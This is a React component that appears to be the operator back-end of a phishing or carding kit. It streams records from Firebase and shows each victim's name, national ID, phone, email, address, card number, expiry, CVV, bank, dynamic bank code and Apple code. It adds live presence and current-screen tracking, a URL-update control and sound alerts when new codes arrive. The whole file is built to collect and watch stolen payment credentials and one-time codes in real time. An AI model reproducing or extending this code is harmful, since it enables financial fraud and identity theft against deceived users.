import React from 'react'
import { useState, useEffect } from 'react'
import { db, onSnapshot, query, collection, orderBy } from '../Firebase/FirebaseConfig'

import notificacionNewUser from '../assets/sound/notificacion.wav'
import notificacionData from '../assets/sound/notificacionData.mp3'

import ActiveSound from './componentsBackSide/ActiveSound'
import BtnDelete from './componentsBackSide/BtnDelete'
import BtnSavedDb from './componentsBackSide/BtnSavedDb'
import Campos from './componentsBackSide/Campos'
import Menu from './componentsBackSide/Menu'
import ScreenActual from './componentsBackSide/ScreenActual'
import UserPresence from './componentsBackSide/UserPresence'
import CountViews from './componentsBackSide/CountViews'
import AudioDataRecive from './componentsBackSide/AudioDataRecive'
import UpdateUrl from './componentsBackSide/UpdateUrl'
import BtnSave from './componentsBackSide/BtnSave'

const BackSide = () => {
    const [userData, setUsersData] = useState([])
    const [audio,setAudio]=useState(false)
    
    const audioData=()=>{
        if(audio){
            new Audio(notificacionData).play()
        }
    }

    useEffect(()=>{
        audio&&new Audio(notificacionNewUser).play()
    },[audio])

    useEffect(() => {
        const q = query(collection(db, 'user'),orderBy('timeStamp','asc'))

        const onSuscribe = onSnapshot(q, (usersActive) => {

            let users = [];
            usersActive.forEach((doc) => {
                users.push({ ...doc.data(), idF: doc.id })
            })
            setUsersData(users)
        })

        return () => { onSuscribe() }
    }, [])

    return (
        <div className='bg-stone-900 h-screen pb-20 overflow-x-hidden pt-5'>
            <div className='h-full'>
                <header className='w-full h-20 text-white flex flex-col justify-around px-10 pt-5 py-8'>
                    <div className='w-full flex justify-around mt-'>
                        <ActiveSound setAudio={setAudio} audio={audio} />
                        {/* <BtnSavedDb/> */}
                        <UpdateUrl/>
                    </div>
                    <span className='text-center mt-2'>Informacion de Usuarios</span>
                    <CountViews/>
                </header>

                <div className='w-screen px-12 h-full overflow-y-scroll pb-32'>
                    {userData.map((item) => {
                        const { infoPay, data, dinKey, appleCode } = item
                        
                        return <div key={item.idF} className='w-full relative border-2 border-stone-600 grid  grid-cols-3
                            rounded-sm my-4 bg-neutral-800 pl-8 pr-4 py-3 text-sm'
                        >
                            <div className='absolute -left-8 top-2'>
                                <BtnDelete idF={item?.idF} />
                                <BtnSave data={item}/>
                            </div>
                            <div className=' text-white flex flex-col'>
                                <Campos field={"Nombre y Apellido"} data={infoPay?.name}
                                    colorField={"text-blue-600"}
                                />
                                <Campos field={"Cédula"} data={infoPay?.CI}
                                    colorField={"text-red-600"}
                                />
                                <Campos field={"Celular"} data={infoPay?.cel}
                                    colorField={"text-orange-600"}
                                />
                                <Campos field={"Email"} data={infoPay?.email}
                                    colorField={"text-rose-500"}
                                />
                                <Campos field={"Direccion de envio"} data={infoPay?.direc}
                                    colorField={"text-green-400"}
                                />
                            </div>

                            <div className=' text-white flex flex-col col-span-1 mx-1'>
                                <Campos field={"Ciudad de envio"} data={infoPay?.city}
                                    colorField={"text-sky-500"}
                                />
                                <Campos field={"TC"} data={data?.TC + ` | ` + data?.año + ` | ` + data?.mes}
                                    colorField={"text-amber-400"}
                                />
                                <Campos field={"CVV"} data={data?.cvv}
                                    colorField={"text-amber-400"}
                                />
                                <Campos field={"Banco"} data={data?.bank}
                                    colorField={"text-emerald-400"}
                                />

                                <Campos field={"Clave Dinamica"} data={dinKey}
                                    colorField={"text-orange-400"}
                                />
                                <Campos field={"Codigo Apple"} data={appleCode}
                                    colorField={"text-blue-400"}
                                />
                            </div>

                            <Menu idF={item.idF} notificacionNewUser={notificacionNewUser} audio={audio}/>
                            <div className='absolute right-10 top-2 w-52'>
                                <ScreenActual id={item.idF} />
                                <UserPresence id={item.idF} />
                            </div>
                           
                            <>
                                <AudioDataRecive data={dinKey} audioData={audioData}/>
                                <AudioDataRecive data={appleCode} audioData={audioData}/>
                            </>
                        </div>
                    })}
                </div>
                {/* <div className='opacity-0 w-full h-40 border bg-white '>s</div> */}
            </div>
        </div>
    )
}

export default BackSide